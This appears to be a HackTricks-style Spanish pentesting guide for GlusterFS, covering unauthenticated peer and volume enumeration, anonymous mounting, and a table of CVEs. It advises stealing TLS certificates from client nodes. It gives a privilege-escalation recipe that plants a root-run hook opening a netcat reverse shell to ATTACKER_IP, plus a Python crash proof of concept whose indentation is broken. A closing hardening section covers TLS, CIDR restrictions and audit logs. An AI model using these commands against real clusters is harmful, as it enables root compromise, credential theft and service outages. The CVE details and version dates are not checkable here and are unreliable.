# 24007-24008-24009-49152 - Pentesting GlusterFS

{{#include ../banners/hacktricks-training.md}}

## Información Básica

**GlusterFS** es un **sistema de archivos distribuido** que combina almacenamiento de múltiples servidores en un **espacio de nombres unificado**. El demonio de gestión (`glusterd`) escucha por defecto en **24007/TCP** e instruye a los ladrillos del plano de datos que comienzan en **49152/TCP** (un puerto por ladrillo, incrementando). Las versiones anteriores a 9.x usaban **24008–24009/TCP** para el transporte de ladrillos, por lo que aún encontrarás esos puertos en clústeres heredados.
```
PORT      STATE  SERVICE        VERSION
24007/tcp open   glusterd       GlusterFS (RPC)
49152/tcp open   gluster-brick  SSL (TLS optional)
```
> Consejo: 24007 responde a las llamadas RPC incluso cuando los nodos solo de almacenamiento **no** exportan ningún volumen; por lo tanto, el servicio es un objetivo de pivote confiable dentro de grandes infraestructuras.

## Enumeración

Instala las utilidades del cliente en tu máquina de ataque:
```bash
sudo apt install -y glusterfs-cli glusterfs-client   # Debian/Ubuntu
```
1. **Descubrimiento de pares y salud**
```bash
# List peers (works without authentication in default setups)
gluster --remote-host 10.10.11.131 peer status
```
2. **Reconocimiento de volúmenes**
```bash
# Retrieve the list of all volumes and their configuration
gluster --remote-host 10.10.11.131 volume info all
```
3. **Montar sin privilegios**
```bash
sudo mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/gluster
```
Si el montaje falla, verifica `/var/log/glusterfs/<vol_name>-<uid>.log` en el lado del cliente. Los problemas comunes son:

* Aplicación de TLS (`option transport.socket.ssl on`)
* Control de acceso basado en direcciones (`option auth.allow <cidr>`)

### Solución de problemas de certificados

Roba los siguientes archivos de cualquier nodo cliente autorizado y colócalos en `/etc/ssl/` (o en el directorio mostrado en el registro de errores):
```
/etc/ssl/glusterfs.pem
/etc/ssl/glusterfs.key
/etc/ssl/glusterfs.ca
```
---

## Vulnerabilidades Conocidas (2022-2025)

| CVE | Versiones afectadas | Impacto | Notas |
|-----|---------------------|---------|-------|
| **CVE-2022-48340** | 10.0–10.4, 11.0 | Uso después de liberar en `dht_setxattr_mds_cbk` accesible a través de la red | **DoS** remoto y probable RCE. Corregido en 10.4.1 / 11.1. |
| **CVE-2023-26253** | < 11.0 | Lectura fuera de límites en el manejador de notificaciones de FUSE | Caída remota a través de operaciones FS manipuladas; PoC público disponible. |
| **CVE-2023-3775** | < 10.5 / 11.1 | Validación incorrecta de permisos al montar `gluster_shared_storage` | Permite a cualquier cliente no autenticado montar el volumen de administración – conduce a **priv-esc** explicado a continuación. |

> Siempre verifica `gluster --version` **en cada nodo**; los clústeres heterogéneos son comunes después de actualizaciones parciales.

### Explotando `gluster_shared_storage` (Escalación de Privilegios)

Incluso en versiones recientes, muchos administradores dejan el volumen especial `gluster_shared_storage` legible por todos porque simplifica la geo-replicación. El volumen contiene plantillas de cronjob que se ejecutan con **root** en cada nodo.
```bash
# 1. Mount admin volume anonymously
mkdir /tmp/gss && sudo mount -t glusterfs 10.10.11.131:/gluster_shared_storage /tmp/gss

# 2. Drop malicious script that gets synchronised cluster-wide
cat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh
#!/bin/bash
nc -e /bin/bash ATTACKER_IP 4444 &
EOF
chmod +x /tmp/gss/hooks/1/start/post/test.sh

# 3. Wait until glusterd distributes the hook and executes it as root
```
Si `hooks/1/` no está presente, busca `/ss_bricks/` – la ruta exacta puede variar con la versión principal.

### Denial-of-Service PoC (CVE-2023-26253)
```python
#!/usr/bin/env python3
# Minimal reproducer: sends malformed NOTIFY_REPLY XDR frame to 24007
import socket, xdrlib, struct
p = xdrlib.Packer(); p.pack_uint(0xdeadbeef)
with socket.create_connection(("10.10.11.131",24007)) as s:
s.send(struct.pack("!L", len(p.get_buffer())|0x80000000))
s.send(p.get_buffer())
```
Ejecutar el script hace que `glusterfsd` se bloquee < 11.0.

---

## Endurecimiento y Detección

* **Actualizar** – la LTS actual es 11.1 (julio de 2025). Todos los CVEs anteriores están solucionados.
* Habilitar **TLS** para cada brick:

```bash
gluster volume set <vol> transport.socket.ssl on
gluster volume set <vol> transport.socket.ssl-cert /etc/ssl/glusterfs.pem
```
* Restringir clientes con listas CIDR:

```bash
gluster volume set <vol> auth.allow 10.0.0.0/24
```
* Exponer el puerto de gestión 24007 solo en una **VLAN privada** o a través de túneles SSH.
* Vigilar los registros: `tail -f /var/log/glusterfs/glusterd.log` y configurar la función de **audit-log** (`volume set <vol> features.audit-log on`).

---

## Referencias

* [GlusterFS security advisories](https://docs.gluster.org/en/latest/release-notes/#security)
* [CVE-2023-26253 PoC – github.com/tinynetwork/gluster-notify-crash](https://github.com/tinynetwork/gluster-notify-crash)
{{#include ../banners/hacktricks-training.md}}
